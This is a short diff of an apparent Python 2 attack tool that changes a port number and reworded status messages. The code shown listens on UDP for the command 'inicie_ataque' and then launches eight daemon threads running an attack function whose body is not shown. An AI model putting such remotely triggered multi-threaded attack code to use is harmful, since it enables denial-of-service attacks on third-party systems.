@@ -114,7 +114,7 @@ def funcao_attack():
 
 
 def escutando():
-	PORT_NUMBER = 13007
+	PORT_NUMBER = 13000
 	SIZE = 1024
 	hostName = '0.0.0.0' 
 	mySocket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
@@ -130,13 +130,13 @@ def escutando():
 	thread_ataque7 = Thread(target=funcao_attack)
 	thread_ataque8 = Thread(target=funcao_attack)
 
-	print 'Escutando',PORT_NUMBER
+	print 'Escutando na porta :',PORT_NUMBER
 	
 	while True:
 		(data,addr) = mySocket.recvfrom(SIZE)
 		print data
 		if data == 'inicie_ataque':
-			print 'entrou'
+			print 'O ataque foi iniciado !'
 			thread_ataque0.setDaemon(True)
 			thread_ataque1.setDaemon(True)
 			thread_ataque2.setDaemon(True)
